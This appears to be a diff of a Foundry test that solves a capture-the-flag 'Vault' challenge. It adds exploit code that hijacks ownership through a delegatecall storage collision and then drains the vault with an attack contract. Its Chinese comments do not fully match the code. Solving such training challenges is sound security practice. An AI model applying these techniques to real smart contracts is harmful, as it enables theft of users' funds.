@@ -3,16 +3,15 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
-
-
-
+import "./VaultAttack.sol";
 
 contract VaultExploiter is Test {
     Vault public vault;
     VaultLogic public logic;
+    VaultAttack public attacker;
 
-    address owner = address (1);
-    address palyer = address (2);
+    address owner = address(1);
+    address player = address(2);
 
     function setUp() public {
         vm.deal(owner, 1 ether);
@@ -23,17 +22,23 @@ contract VaultExploiter is Test {
 
         vault.deposite{value: 0.1 ether}();
         vm.stopPrank();
-
     }
 
     function testExploit() public {
-        vm.deal(palyer, 1 ether);
-        vm.startPrank(palyer);
+        vm.deal(player, 1 ether);
+        vm.startPrank(player);
 
-        // add your hacker code.
+        // 使用delegatecall调用changeOwner函数，将owner更改为攻击合约地址
+        (bool success,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", address(logic), player));
+        require(success, "Attack failed");
+        vault.openWithdraw();
+
+        // 部署攻击合约
+        attacker = new VaultAttack{value: 0.1 ether}(vault);
+        // // 使用攻击合约提款
+        attacker.attack();
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
     }
-
 }
